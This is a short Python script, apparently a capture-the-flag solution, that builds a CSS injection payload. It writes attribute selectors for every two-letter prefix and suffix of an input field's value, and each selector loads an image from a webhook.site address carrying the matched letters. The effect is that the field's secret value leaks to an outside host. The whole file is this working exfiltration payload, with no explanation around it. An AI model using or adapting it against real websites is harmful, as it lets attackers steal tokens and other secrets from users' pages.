import string

result = ""
for i in string.ascii_lowercase:
    for j in string.ascii_lowercase:
        result += 'input[value^="' + i + j + '"] {background-image:url(https://webhook.site/6100aeb8-f1a4-481d-9027-8827d1c3b188?flag=' + i + j + ');}'
for i in string.ascii_lowercase:
    for j in string.ascii_lowercase:
        result += 'input[value$="' + i + j + '"] {border-image:url(https://webhook.site/6100aeb8-f1a4-481d-9027-8827d1c3b188?flag=' + i + j + ');}'
print(result)